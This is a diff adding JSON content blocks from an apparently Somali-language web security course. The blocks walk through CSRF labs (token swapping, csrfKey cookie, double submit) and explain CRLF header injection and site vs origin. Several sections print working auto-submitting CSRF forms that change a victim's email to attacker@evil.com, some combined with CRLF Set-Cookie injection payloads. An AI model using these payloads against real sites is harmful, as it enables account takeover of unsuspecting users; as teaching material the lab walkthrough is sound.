+     ],
+     "id": "part-6-b26"
+    },
+    {
+     "type": "para",
+     "html": "Tallaabo 3: Isku beddel token-ka",
+     "text": "Tallaabo 3: Isku beddel token-ka",
+     "id": "part-6-b27"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "Repeater ku dir request-ka carlos.",
+       "text": "Repeater ku dir request-ka carlos.",
+       "level": 0
+      },
+      {
+       "html": "Beddel <code>csrf=CARLOS_TOKEN</code> → <code>csrf=WIENER_TOKEN</code>.",
+       "text": "Beddel csrf=CARLOS_TOKEN → csrf=WIENER_TOKEN.",
+       "level": 0
+      },
+      {
+       "html": "Riix Send.",
+       "text": "Riix Send.",
+       "level": 0
+      },
+      {
+       "html": "Haddii la aqbalo → waa vulnerable.",
+       "text": "Haddii la aqbalo → waa vulnerable.",
+       "level": 0
+      }
+     ],
+     "id": "part-6-b28"
+    },
+    {
+     "type": "para",
+     "html": "Tallaabo 4: Samee exploit",
+     "text": "Tallaabo 4: Samee exploit",
+     "id": "part-6-b29"
+    },
+    {
+     "type": "code",
+     "lang": null,
+     "lines": [
+      "<form method=\"POST\" action=\"https://LAB-ID.web-security-academy.net/my-account/change-email\">",
+      "    <input type=\"hidden\" name=\"email\" value=\"attacker@evil.com\">",
+      "    <input type=\"hidden\" name=\"csrf\" value=\"WIENER_TOKEN\">",
+      "</form>",
+      "<script>document.forms[0].submit();</script>"
+     ],
+     "id": "part-6-b30"
+    },
+    {
+     "type": "para",
+     "html": "Tallaabo 5: Deliver",
+     "text": "Tallaabo 5: Deliver",
+     "id": "part-6-b31"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "Soo qaado token cusub (single-use).",
+       "text": "Soo qaado token cusub (single-use).",
+       "level": 0
+      },
+      {
+       "html": "Beddel email-ka.",
+       "text": "Beddel email-ka.",
+       "level": 0
+      },
+      {
+       "html": "Store, Deliver.",
+       "text": "Store, Deliver.",
+       "level": 0
+      }
+     ],
+     "id": "part-6-b32"
+    },
+    {
+     "type": "heading",
+     "level": 3,
+     "html": " Lab-ka 5: Token Tied to Non-Session Cookie ",
+     "text": "Lab-ka 5: Token Tied to Non-Session Cookie",
+     "id": "part-6-b33",
+     "slug": "lab-ka-5-token-tied-to-non-session-cookie"
+    },
+    {
+     "type": "para",
+     "html": "Lab-kan wuxuu leeyahay laba qaybood:",
+     "text": "Lab-kan wuxuu leeyahay laba qaybood:",
+     "id": "part-6-b34"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "<code>session</code> cookie — wuxuu aqoonsadaa user-ka.",
+       "text": "session cookie — wuxuu aqoonsadaa user-ka.",
+       "level": 0
+      },
+      {
+       "html": "<code>csrfKey</code> cookie — wuxuu xaqiijiyaa CSRF token-ka.",
+       "text": "csrfKey cookie — wuxuu xaqiijiyaa CSRF token-ka.",
+       "level": 0
+      }
+     ],
+     "id": "part-6-b35"
+    },
+    {
+     "type": "para",
+     "html": "Lab-kan wuxuu ku barayaa in laba qaybood oo ammaan ay isku dhafan si qaldan. Wuxuu ku barayaa in qayb kastaa ay u dhaqmi karto si ka duwan marka la isku daro.",
+     "text": "Lab-kan wuxuu ku barayaa in laba qaybood oo ammaan ay isku dhafan si qaldan. Wuxuu ku barayaa in qayb kastaa ay u dhaqmi karto si ka duwan marka la isku daro.",
+     "id": "part-6-b36"
+    },
+    {
+     "type": "para",
+     "html": "Maxay tahay \"csrfKey\"?",
+     "text": "Maxay tahay \"csrfKey\"?",
+     "id": "part-6-b37"
+    },
+    {
+     "type": "para",
+     "html": "Jawaab: <code>csrfKey</code> waa cookie oo lagu xaqiijiyo CSRF token-ka. Waa qayb labaad oo amniga.",
+     "text": "Jawaab: csrfKey waa cookie oo lagu xaqiijiyo CSRF token-ka. Waa qayb labaad oo amniga.",
+     "id": "part-6-b38"
+    },
+    {
+     "type": "para",
+     "html": "Su'aal: Maxay u jirtaa qayb labaad?",
+     "text": "Su'aal: Maxay u jirtaa qayb labaad?",
+     "id": "part-6-b39"
+    },
+    {
+     "type": "para",
+     "html": "Jawaab: Sababtoo ah developer-ku wuxuu rabay stateless CSRF. Wuxuu rabay in aanu session-ka u baahnayn inuu kaydiyo token-ka. Wuxuu rabay in cookie-ga uu xaqiijiyo token-ka.",
+     "text": "Jawaab: Sababtoo ah developer-ku wuxuu rabay stateless CSRF. Wuxuu rabay in aanu session-ka u baahnayn inuu kaydiyo token-ka. Wuxuu rabay in cookie-ga uu xaqiijiyo token-ka.",
+     "id": "part-6-b40"
+    },
+    {
+     "type": "para",
+     "html": "Developer-ku wuxuu rabay simplicity. Wuxuu rabay statelessness. Wuxuu illoobaa in statelessness ay tahay trade-off. Wuxuu illoobaa in cookie-ga uu yahay attacker-controlled haddii CRLF injection jiro.",
+     "text": "Developer-ku wuxuu rabay simplicity. Wuxuu rabay statelessness. Wuxuu illoobaa in statelessness ay tahay trade-off. Wuxuu illoobaa in cookie-ga uu yahay attacker-controlled haddii CRLF injection jiro.",
+     "id": "part-6-b41"
+    },
+    {
+     "type": "para",
+     "html": "Dhibaatada:",
+     "text": "Dhibaatada:",
+     "id": "part-6-b42"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "<code>session</code> cookie waa HttpOnly — attacker-ku ma akhrin karo.",
+       "text": "session cookie waa HttpOnly — attacker-ku ma akhrin karo.",
+       "level": 0
+      },
+      {
+       "html": "<code>csrfKey</code> cookie waa non-HttpOnly — attacker-ku wuu akhriyi karaa (haddii XSS jiro).",
+       "text": "csrfKey cookie waa non-HttpOnly — attacker-ku wuu akhriyi karaa (haddii XSS jiro).",
+       "level": 0
+      },
+      {
+       "html": "<code>csrfKey</code> cookie lama xiriirin <code>session</code> cookie.",
+       "text": "csrfKey cookie lama xiriirin session cookie.",
+       "level": 0
+      }
+     ],
+     "id": "part-6-b43"
+    },
+    {
+     "type": "para",
+     "html": "Laba qaybood oo kala duwan. Mid kastaa waa ammaan gudaha. Laakiin xiriirka u dhexeeya waa jaban yahay. Waa composition problem.",
+     "text": "Laba qaybood oo kala duwan. Mid kastaa waa ammaan gudaha. Laakiin xiriirka u dhexeeya waa jaban yahay. Waa composition problem.",
+     "id": "part-6-b44"
+    },
+    {
+     "type": "heading",
+     "level": 4,
+     "html": "Marka Qoraalku Noqdo Code",
+     "text": "Marka Qoraalku Noqdo Code",
+     "id": "part-6-b45",
+     "slug": "marka-qoraalku-noqdo-code"
+    },
+    {
+     "type": "para",
+     "html": "CRLF injection Waa marka qoraalku noqdo code. Waa marka data noqdo control.",
+     "text": "CRLF injection Waa marka qoraalku noqdo code. Waa marka data noqdo control.",
+     "id": "part-6-b46"
+    },
+    {
+     "type": "para",
+     "html": "HTTP waa qoraal. Headers waa qoraal. Marka attacker-ku uu geliyo <code>%0d%0a</code>, wuxuu u sheegaa server-ka: \"Halkan waa line cusub.\" Wuxuu qoraalka u beddelaa control.",
+     "text": "HTTP waa qoraal. Headers waa qoraal. Marka attacker-ku uu geliyo %0d%0a, wuxuu u sheegaa server-ka: \"Halkan waa line cusub.\" Wuxuu qoraalka u beddelaa control.",
+     "id": "part-6-b47"
+    },
+    {
+     "type": "para",
+     "html": "Tusaale:",
+     "text": "Tusaale:",
+     "id": "part-6-b48"
+    },
+    {
+     "type": "code",
+     "lang": null,
+     "lines": [
+      "Input:  test%0d%0aSet-Cookie:%20csrfKey=attacker",
+      "Output: Set-Cookie: search=test",
+      "        Set-Cookie: csrfKey=attacker"
+     ],
+     "id": "part-6-b49"
+    },
+    {
+     "type": "para",
+     "html": "Qoraalku wuxuu noqday code. Data wuxuu noqday control. Input wuxuu noqday output.",
+     "text": "Qoraalku wuxuu noqday code. Data wuxuu noqday control. Input wuxuu noqday output.",
+     "id": "part-6-b50"
+    },
+    {
+     "type": "para",
+     "html": "CRLF injection waa bridge Waa xiriir. Wuxuu u ogolaataa attacker inuu cookie-ga ku soo dhex geliyo browser-ka victim. Wuxuu u ogolaataa attacker inuu qaybta labaad maamulo.",
+     "text": "CRLF injection waa bridge Waa xiriir. Wuxuu u ogolaataa attacker inuu cookie-ga ku soo dhex geliyo browser-ka victim. Wuxuu u ogolaataa attacker inuu qaybta labaad maamulo.",
+     "id": "part-6-b51"
+    },
+    {
+     "type": "heading",
+     "level": 4,
+     "html": " Sida Loo Tijaabiyo",
+     "text": "Sida Loo Tijaabiyo",
+     "id": "part-6-b52",
+     "slug": "sida-loo-tijaabiyo"
+    },
+    {
+     "type": "para",
+     "html": "Tallaabo 1: Login wiener",
+     "text": "Tallaabo 1: Login wiener",
+     "id": "part-6-b53"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "Qabo <code>csrfKey</code> iyo <code>csrf</code>.",
+       "text": "Qabo csrfKey iyo csrf.",
+       "level": 0
+      }
+     ],
+     "id": "part-6-b54"
+    },
+    {
+     "type": "para",
+     "html": "Tallaabo 2: Tijaabi <code>csrfKey</code>",
+     "text": "Tallaabo 2: Tijaabi csrfKey",
+     "id": "part-6-b55"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "Beddel <code>session</code> → logout.",
+       "text": "Beddel session → logout.",
+       "level": 0
+      },
+      {
+       "html": "Beddel <code>csrfKey</code> → CSRF token waa la diiday, laakiin lama saarin.",
+       "text": "Beddel csrfKey → CSRF token waa la diiday, laakiin lama saarin.",
+       "level": 0
+      },
+      {
+       "html": "<code>csrfKey</code> wuu jiraa laakiin session-ka lama xiriirin.",
+       "text": "csrfKey wuu jiraa laakiin session-ka lama xiriirin.",
+       "level": 0
+      }
+     ],
+     "id": "part-6-b56"
+    },
+    {
+     "type": "para",
+     "html": "Tallaabo 3: Tijaabi isku beddel",
+     "text": "Tallaabo 3: Tijaabi isku beddel",
+     "id": "part-6-b57"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "Login carlos (incognito).",
+       "text": "Login carlos (incognito).",
+       "level": 0
+      },
+      {
+       "html": "Ku beddel <code>csrfKey</code> iyo <code>csrf</code> ee carlos → wiener.",
+       "text": "Ku beddel csrfKey iyo csrf ee carlos → wiener.",
+       "level": 0
+      },
+      {
+       "html": "Haddii uu aqbalo → waa vulnerable.",
+       "text": "Haddii uu aqbalo → waa vulnerable.",
+       "level": 0
+      }
+     ],
+     "id": "part-6-b58"
+    },
+    {
+     "type": "para",
+     "html": "Tallaabo 4: Tijaabi CRLF",
+     "text": "Tallaabo 4: Tijaabi CRLF",
+     "id": "part-6-b59"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "Search samee.",
+       "text": "Search samee.",
+       "level": 0
+      },
+      {
+       "html": "Repeater ku dir <code>search=test%0d%0aSet-Cookie</code><code>:%</code><code>20csrfKey=WIENER_KEY%3b%20SameSite=None</code>.",
+       "text": "Repeater ku dir search=test%0d%0aSet-Cookie:%20csrfKey=WIENER_KEY%3b%20SameSite=None.",
+       "level": 0
+      },
+      {
+       "html": "Haddii response-ku soo celiyo <code>Set-Cookie: csrfKey=WIENER_KEY</code> → waa shaqeynaysaa.",
+       "text": "Haddii response-ku soo celiyo Set-Cookie: csrfKey=WIENER_KEY → waa shaqeynaysaa.",
+       "level": 0
+      }
+     ],
+     "id": "part-6-b60"
+    },
+    {
+     "type": "para",
+     "html": "Tallaabo 5: Samee exploit",
+     "text": "Tallaabo 5: Samee exploit",
+     "id": "part-6-b61"
+    },
+    {
+     "type": "code",
+     "lang": "html",
+     "lines": [
+      "<form method=\"POST\" action=\"https://LAB-ID.web-security-academy.net/my-account/change-email\">",
+      "    <input type=\"hidden\" name=\"email\" value=\"attacker@evil.com\">",
+      "    <input type=\"hidden\" name=\"csrf\" value=\"FRESH_WIENER_TOKEN\">",
+      "</form>",
+      "<img src=\"https://LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=WIENER_KEY%3b%20SameSite=None\" onerror=\"document.forms[0].submit()\">"
+     ],
+     "id": "part-6-b62"
+    },
+    {
+     "type": "para",
+     "html": "Tallaabo 6: Deliver",
+     "text": "Tallaabo 6: Deliver",
+     "id": "part-6-b63"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "Soo qaado token cusub.",
+       "text": "Soo qaado token cusub.",
+       "level": 0
+      },
+      {
+       "html": "Beddel email-ka.",
+       "text": "Beddel email-ka.",
+       "level": 0
+      },
+      {
+       "html": "Store, Deliver.",
+       "text": "Store, Deliver.",
+       "level": 0
+      }
+     ],
+     "id": "part-6-b64"
+    },
+    {
+     "type": "heading",
+     "level": 3,
+     "html": "Lab-ka 6: Token Duplicated in Cookie ",
+     "text": "Lab-ka 6: Token Duplicated in Cookie",
+     "id": "part-6-b65",
+     "slug": "lab-ka-6-token-duplicated-in-cookie"
+    },
+    {
+     "type": "para",
+     "html": "Lab-kan wuxuu leeyahay double submit: <code>csrf</code> cookie == <code>csrf</code> body. Attacker wuxuu isticmaalaa CRLF injection si uu <code>csrf=fake</code> ugu soo dhex geliyo browser-ka victim.",
+     "text": "Lab-kan wuxuu leeyahay double submit: csrf cookie == csrf body. Attacker wuxuu isticmaalaa CRLF injection si uu csrf=fake ugu soo dhex geliyo browser-ka victim.",
+     "id": "part-6-b66"
+    },
+    {
+     "type": "para",
+     "html": "Lab-kan wuxuu ku barayaa in statelessness ay tahay khiyaali. Wuxuu ku barayaa in \"double submit\" uu yahay defense jaban.",
+     "text": "Lab-kan wuxuu ku barayaa in statelessness ay tahay khiyaali. Wuxuu ku barayaa in \"double submit\" uu yahay defense jaban.",
+     "id": "part-6-b67"
+    },
+    {
+     "type": "heading",
+     "level": 4,
+     "html": "6.4.2 Falsafadda Double Submit",
+     "text": "6.4.2 Falsafadda Double Submit",
+     "id": "part-6-b68",
+     "slug": "6-4-2-falsafadda-double-submit"
+    },
+    {
+     "type": "para",
+     "html": "Double submit waa \"Haddii token-ka body-ga iyo cookie-ga isku mid yihiin, request-ka waa la aqbalayaa.\"",
+     "text": "Double submit waa \"Haddii token-ka body-ga iyo cookie-ga isku mid yihiin, request-ka waa la aqbalayaa.\"",
+     "id": "part-6-b69"
+    },
+    {
+     "type": "para",
+     "html": "Double submit wuxuu ku salaysan yahay male-awaal:",
+     "text": "Double submit wuxuu ku salaysan yahay male-awaal:",
+     "id": "part-6-b70"
+    },
+    {
+     "type": "list",
+     "ordered": true,
+     "items": [
+      {
+       "html": "Attacker-ku ma dhigi karo cookie-ga browser-ka victim.",
+       "text": "Attacker-ku ma dhigi karo cookie-ga browser-ka victim.",
+       "level": 0
+      },
+      {
+       "html": "Attacker-ku ma garanayo token-ka.",
+       "text": "Attacker-ku ma garanayo token-ka.",
+       "level": 0
+      },
+      {
+       "html": "Attacker-ku ma saadaalin karo token-ka.",
+       "text": "Attacker-ku ma saadaalin karo token-ka.",
+       "level": 0
+      }
+     ],
+     "id": "part-6-b71"
+    },
+    {
+     "type": "para",
+     "html": "Male-awaalka 1 waa khaldan haddii CRLF injection jiro. Attacker-ku wuxuu dhigi karaa cookie-ga browser-ka victim. Markaas, wuxuu dhigi karaa <code>csrf=fake</code> cookie-ga, kadibna wuxuu diraa <code>csrf=fake</code> body-ga. Labaduba isku mid → la aqbalayaa.",
+     "text": "Male-awaalka 1 waa khaldan haddii CRLF injection jiro. Attacker-ku wuxuu dhigi karaa cookie-ga browser-ka victim. Markaas, wuxuu dhigi karaa csrf=fake cookie-ga, kadibna wuxuu diraa csrf=fake body-ga. Labaduba isku mid → la aqbalayaa.",
+     "id": "part-6-b72"
+    },
+    {
+     "type": "para",
+     "html": "Double submit wuxuu isku halayaa cookie-ga ammaan. Laakiin cookie-ga ma aha ammaan haddii CRLF injection jiro.",
+     "text": "Double submit wuxuu isku halayaa cookie-ga ammaan. Laakiin cookie-ga ma aha ammaan haddii CRLF injection jiro.",
+     "id": "part-6-b73"
+    },
+    {
+     "type": "para",
+     "html": "Statelessness waa \"Ha kaydin state server-ka. Isticmaal cookie-ga.\"",
+     "text": "Statelessness waa \"Ha kaydin state server-ka. Isticmaal cookie-ga.\"",
+     "id": "part-6-b74"
+    },
+    {
+     "type": "para",
+     "html": "Statelessness waa trade-off. Wuxuu keenayaa simplicity. Wuxuu keenayaa scalability. Wuxuu keenayaa performance. Laakiin wuxuu keenayaa khatar haddii aan la ilaalin.",
+     "text": "Statelessness waa trade-off. Wuxuu keenayaa simplicity. Wuxuu keenayaa scalability. Wuxuu keenayaa performance. Laakiin wuxuu keenayaa khatar haddii aan la ilaalin.",
+     "id": "part-6-b75"
+    },
+    {
+     "type": "para",
+     "html": "Tusaale:",
+     "text": "Tusaale:",
+     "id": "part-6-b76"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "Session-based CSRF: Token-ka waxaa lagu kaydiyaa session-ka. Waa stateful. Waa ammaan.",
+       "text": "Session-based CSRF: Token-ka waxaa lagu kaydiyaa session-ka. Waa stateful. Waa ammaan.",
+       "level": 0
+      },
+      {
+       "html": "Double submit: Token-ka waxaa lagu kaydiyaa cookie-ga. Waa stateless. Waa khatar haddii CRLF injection jiro.",
+       "text": "Double submit: Token-ka waxaa lagu kaydiyaa cookie-ga. Waa stateless. Waa khatar haddii CRLF injection jiro.",
+       "level": 0
+      }
+     ],
+     "id": "part-6-b77"
+    },
+    {
+     "type": "para",
+     "html": "Statelessness. Waa false sense of security.",
+     "text": "Statelessness. Waa false sense of security.",
+     "id": "part-6-b78"
+    },
+    {
+     "type": "heading",
+     "level": 4,
+     "html": "6.4.4 Sida Loo Tijaabiyo",
+     "text": "6.4.4 Sida Loo Tijaabiyo",
+     "id": "part-6-b79",
+     "slug": "6-4-4-sida-loo-tijaabiyo"
+    },
+    {
+     "type": "para",
+     "html": "Tallaabo 1: Login wiener",
+     "text": "Tallaabo 1: Login wiener",
+     "id": "part-6-b80"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "Eeg request-ka: <code>csrf</code> cookie == <code>csrf</code> body.",
+       "text": "Eeg request-ka: csrf cookie == csrf body.",
+       "level": 0
+      }
+     ],
+     "id": "part-6-b81"
+    },
+    {
+     "type": "para",
+     "html": "Tallaabo 2: Tijaabi double submit",
+     "text": "Tallaabo 2: Tijaabi double submit",
+     "id": "part-6-b82"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "Beddel <code>csrf</code> body → waa la diiday.",
+       "text": "Beddel csrf body → waa la diiday.",
+       "level": 0
+      },
+      {
+       "html": "Beddel <code>csrf</code> cookie → waa la diiday.",
+       "text": "Beddel csrf cookie → waa la diiday.",
+       "level": 0
+      },
+      {
+       "html": "Beddel labadaba si isku mid ah → waa la aqbalay.",
+       "text": "Beddel labadaba si isku mid ah → waa la aqbalay.",
+       "level": 0
+      },
+      {
+       "html": "Double submit.",
+       "text": "Double submit.",
+       "level": 0
+      }
+     ],
+     "id": "part-6-b83"
+    },
+    {
+     "type": "para",
+     "html": "Tallaabo 3: Tijaabi CRLF",
+     "text": "Tallaabo 3: Tijaabi CRLF",
+     "id": "part-6-b84"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "Search samee.",
+       "text": "Search samee.",
+       "level": 0
+      },
+      {
+       "html": "Repeater ku dir <code>search=test%0d%0aSet-Cookie</code><code>:%</code><code>20csrf=fake%3b%20SameSite=None</code>.",
+       "text": "Repeater ku dir search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None.",
+       "level": 0
+      },
+      {
+       "html": "Haddii response-ku soo celiyo <code>Set-Cookie: csrf=fake</code> → waa shaqeynaysaa.",
+       "text": "Haddii response-ku soo celiyo Set-Cookie: csrf=fake → waa shaqeynaysaa.",
+       "level": 0
+      }
+     ],
+     "id": "part-6-b85"
+    },
+    {
+     "type": "para",
+     "html": "Tallaabo 4: Samee exploit",
+     "text": "Tallaabo 4: Samee exploit",
+     "id": "part-6-b86"
+    },
+    {
+     "type": "code",
+     "lang": "html",
+     "lines": [
+      "<form method=\"POST\" action=\"https://LAB-ID.web-security-academy.net/my-account/change-email\">",
+      "    <input type=\"hidden\" name=\"email\" value=\"attacker@evil.com\">",
+      "    <input type=\"hidden\" name=\"csrf\" value=\"fake\">",
+      "</form>",
+      "<img src=\"https://LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None\" onerror=\"document.forms[0].submit();\">"
+     ],
+     "id": "part-6-b87"
+    },
+    {
+     "type": "para",
+     "html": "Tallaabo 5: Deliver",
+     "text": "Tallaabo 5: Deliver",
+     "id": "part-6-b88"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "Beddel email-ka.",
+       "text": "Beddel email-ka.",
+       "level": 0
+      },
+      {
+       "html": "Store, Deliver.",
+       "text": "Store, Deliver.",
+       "level": 0
+      }
+     ],
+     "id": "part-6-b89"
+    },
+    {
+     "type": "heading",
+     "level": 3,
+     "html": "CRLF: ",
+     "text": "CRLF:",
+     "id": "part-6-b90",
+     "slug": "crlf"
+    },
+    {
+     "type": "para",
+     "html": "CRLF waa Carriage Return + Line Feed. Waa <code>%0d%0a</code>. Waa calaamad oo u sheegta HTTP: \"Halkan waa line cusub.\"",
+     "text": "CRLF waa Carriage Return + Line Feed. Waa %0d%0a. Waa calaamad oo u sheegta HTTP: \"Halkan waa line cusub.\"",
+     "id": "part-6-b91"
+    },
+    {
+     "type": "para",
+     "html": "CRLF waa boundary. Waa xuduud. Waa kala qaybin. Marka attacker-ku uu geliyo CRLF, wuxuu u sheegaa server-ka: \"Halkan waa qayb cusub.\"",
+     "text": "CRLF waa boundary. Waa xuduud. Waa kala qaybin. Marka attacker-ku uu geliyo CRLF, wuxuu u sheegaa server-ka: \"Halkan waa qayb cusub.\"",
+     "id": "part-6-b92"
+    },
+    {
+     "type": "para",
+     "html": "Qoraal waa data. Code waa control. CRLF wuxuu u beddelaa qoraalka code.",
+     "text": "Qoraal waa data. Code waa control. CRLF wuxuu u beddelaa qoraalka code.",
+     "id": "part-6-b93"
+    },
+    {
+     "type": "para",
+     "html": "Tusaale:",
+     "text": "Tusaale:",
+     "id": "part-6-b94"
+    },
+    {
+     "type": "code",
+     "lang": "text",
+     "lines": [
+      "Input:  test",
+      "Output: Set-Cookie: search=test",
+      "",
+      "Input:  test%0d%0aSet-Cookie:%20csrf=fake",
+      "Output: Set-Cookie: search=test",
+      "        Set-Cookie: csrf=fake"
+     ],
+     "id": "part-6-b95"
+    },
+    {
+     "type": "para",
+     "html": "Qoraalku wuxuu noqday code. Data wuxuu noqday control. Input wuxuu noqday output.",
+     "text": "Qoraalku wuxuu noqday code. Data wuxuu noqday control. Input wuxuu noqday output.",
+     "id": "part-6-b96"
+    },
+    {
+     "type": "heading",
+     "level": 4,
+     "html": "Headers",
+     "text": "Headers",
+     "id": "part-6-b97",
+     "slug": "headers"
+    },
+    {
+     "type": "para",
+     "html": "Headers waa trust boundaries. Waa xuduudaha. Waa qaybaha.",
+     "text": "Headers waa trust boundaries. Waa xuduudaha. Waa qaybaha.",
+     "id": "part-6-b98"
+    },
+    {
+     "type": "para",
+     "html": "Headers waa qoraal. Waa data. Waa control. Marka attacker-ku uu geliyo CRLF, wuxuu jebiyaa xuduudaha. Wuxuu maamulaa headers.",
+     "text": "Headers waa qoraal. Waa data. Waa control. Marka attacker-ku uu geliyo CRLF, wuxuu jebiyaa xuduudaha. Wuxuu maamulaa headers.",
+     "id": "part-6-b99"
+    },
+    {
+     "type": "para",
+     "html": "Tusaale:",
+     "text": "Tusaale:",
+     "id": "part-6-b100"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "<code>Set-Cookie</code> waa header.",
+       "text": "Set-Cookie waa header.",
+       "level": 0
+      },
+      {
+       "html": "<code>Location</code> waa header.",
+       "text": "Location waa header.",
+       "level": 0
+      },
+      {
+       "html": "<code>Content-Type</code> waa header.",
+       "text": "Content-Type waa header.",
+       "level": 0
+      }
+     ],
+     "id": "part-6-b101"
+    },
+    {
+     "type": "para",
+     "html": "Marka attacker-ku uu geliyo CRLF, wuxuu ku dari karaa header cusub. Wuxuu maamuli karaa response-ka.",
+     "text": "Marka attacker-ku uu geliyo CRLF, wuxuu ku dari karaa header cusub. Wuxuu maamuli karaa response-ka.",
+     "id": "part-6-b102"
+    }
+   ],
+   "id": "part-6",
+   "index": 6
+  },
+  {
+   "title": "QAYBTA VII SAMESITE, WEBSOCKET, IYO BEYOND",
+   "blocks": [
+    {
+     "type": "para",
+     "html": "Waxaa jira dhibaato falsafadeed oo ku jirta web-ka. Dhibaatadu waa xuduudaha. Waa boundaries. Waa meesha wax kala go'aan.",
+     "text": "Waxaa jira dhibaato falsafadeed oo ku jirta web-ka. Dhibaatadu waa xuduudaha. Waa boundaries. Waa meesha wax kala go'aan.",
+     "id": "part-7-b0"
+    },
+    {
+     "type": "para",
+     "html": "Aan tusaale ku siiyo. Waa maxay \"website\"?",
+     "text": "Aan tusaale ku siiyo. Waa maxay \"website\"?",
+     "id": "part-7-b1"
+    },
+    {
+     "type": "para",
+     "html": "Jawaabta fudud: Waa <code>example.com</code>.",
+     "text": "Jawaabta fudud: Waa example.com.",
+     "id": "part-7-b2"
+    },
+    {
+     "type": "para",
+     "html": "Jawaabta dheer : Waa <code>example.com</code>, <code>www.example.com</code>, <code>cms.example.com</code>, <code>api.example.com</code>, iyo <code>example.co.uk</code> Waa qaybo badan. Waa xuduudo aan caddayn.",
+     "text": "Jawaabta dheer : Waa example.com, www.example.com, cms.example.com, api.example.com, iyo example.co.uk Waa qaybo badan. Waa xuduudo aan caddayn.",
+     "id": "part-7-b3"
+    },
+    {
+     "type": "para",
+     "html": "Web-ku wuxuu leeyahay xuduudo aan la qeexin. Waa fuzzy boundaries. Waa overlapping boundaries. Waa nested boundaries.",
+     "text": "Web-ku wuxuu leeyahay xuduudo aan la qeexin. Waa fuzzy boundaries. Waa overlapping boundaries. Waa nested boundaries.",
+     "id": "part-7-b4"
+    },
+    {
+     "type": "para",
+     "html": "Tani waa dhibaatada SameSite. SameSite wuxuu ku salaysan yahay \"site\". Laakiin \"site\" ma aha \"origin\". Waa mid ka weyn. Waa mid ka duwan.",
+     "text": "Tani waa dhibaatada SameSite. SameSite wuxuu ku salaysan yahay \"site\". Laakiin \"site\" ma aha \"origin\". Waa mid ka weyn. Waa mid ka duwan.",
+     "id": "part-7-b5"
+    },
+    {
+     "type": "para",
+     "html": "Tani waa dhibaatada WebSocket. WebSocket wuxuu ku salaysan yahay \"origin\". Laakiin WebSocket handshake-ku ma leh CSRF token. Waa trust boundary oo jaban.",
+     "text": "Tani waa dhibaatada WebSocket. WebSocket wuxuu ku salaysan yahay \"origin\". Laakiin WebSocket handshake-ku ma leh CSRF token. Waa trust boundary oo jaban.",
+     "id": "part-7-b6"
+    },
+    {
+     "type": "para",
+     "html": "Tani waa dhibaatada sibling domain. Sibling domain waa isla site. Laakiin waa origin kala duwan. XSS on sibling domain wuxuu u ogolaataa attacker inuu same-site requests sameeyo.",
+     "text": "Tani waa dhibaatada sibling domain. Sibling domain waa isla site. Laakiin waa origin kala duwan. XSS on sibling domain wuxuu u ogolaataa attacker inuu same-site requests sameeyo.",
+     "id": "part-7-b7"
+    },
+    {
+     "type": "para",
+     "html": "Lab-yada sare waxay ku barayaan in xuduudaha aanay caddayn. Waa in aad barato sida loo arko xuduudaha. Waa in aad barato sida loo fahmo xuduudaha. Waa in aad barato sida loo jebiyo xuduudaha.",
+     "text": "Lab-yada sare waxay ku barayaan in xuduudaha aanay caddayn. Waa in aad barato sida loo arko xuduudaha. Waa in aad barato sida loo fahmo xuduudaha. Waa in aad barato sida loo jebiyo xuduudaha.",
+     "id": "part-7-b8"
+    },
+    {
+     "type": "heading",
+     "level": 3,
+     "html": "Site vs Origin",
+     "text": "Site vs Origin",
+     "id": "part-7-b9",
+     "slug": "site-vs-origin"
+    },
+    {
+     "type": "heading",
+     "level": 4,
+     "html": "Fikradda Aasaasiga ah",
+     "text": "Fikradda Aasaasiga ah",
+     "id": "part-7-b10",
+     "slug": "fikradda-aasaasiga-ah"
+    },
+    {
+     "type": "para",
+     "html": "Origin waa scheme + host + port. Tusaale:",
+     "text": "Origin waa scheme + host + port. Tusaale:",
+     "id": "part-7-b11"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "<code>https://example.com</code> — origin.",
+       "text": "https://example.com — origin.",
+       "level": 0
+      },
+      {
+       "html": "<code>https://cms.example.com</code> — origin kale.",
+       "text": "https://cms.example.com — origin kale.",
+       "level": 0
+      },
+      {
+       "html": "<code>http://example.com</code> — origin kale (scheme duwan).",
+       "text": "http://example.com — origin kale (scheme duwan).",
+       "level": 0
+      },
+      {
+       "html": "<code>https://example.com:8080</code> — origin kale (port duwan).",
+       "text": "https://example.com:8080 — origin kale (port duwan).",
+       "level": 0
+      }
+     ],
+     "id": "part-7-b12"
+    },
+    {
+     "type": "para",
+     "html": "Site waa registrable domain (eTLD+1). Tusaale:",
+     "text": "Site waa registrable domain (eTLD+1). Tusaale:",
+     "id": "part-7-b13"
+    },
+    {
+     "type": "list",
+     "ordered": false,
+     "items": [
+      {
+       "html": "<code>example.com</code> — site.",
+       "text": "example.com — site.",
+       "level": 0
+      },
+      {
+       "html": "<code>cms.example.com</code> — isla site.",
+       "text": "cms.example.com — isla site.",
+       "level": 0
+      },
+      {
+       "html": "<code>www.example.com</code> — isla site.",
+       "text": "www.example.com — isla site.",
+       "level": 0
+      },
+      {
+       "html": "<code>example.co.uk</code> — site (eTLD waa <code>co.uk</code>).",
